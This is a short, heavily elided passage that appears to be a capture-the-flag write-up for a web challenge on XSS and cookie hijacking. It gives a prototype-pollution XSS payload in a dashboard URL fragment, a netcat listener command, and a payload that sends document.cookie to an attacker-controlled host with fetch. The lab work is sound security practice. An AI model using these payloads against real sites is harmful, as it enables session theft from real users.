...
tags: [Hack Smarter, Easy, cookie hijacking, XSS, Web]
---
...
http://MachineIP:3000/dashboard#__proto__.renderCallback=%3Csvg/onload=alert(1)%3E/)
...
`nc -lvnp 8000`
MachineIP:3000/dashboard#__proto__.renderCallback=<svg/onload=fetch('http://YOURIP:8000/?c='+document.cookie)>
...
http://MachineIP:3000/incident-response
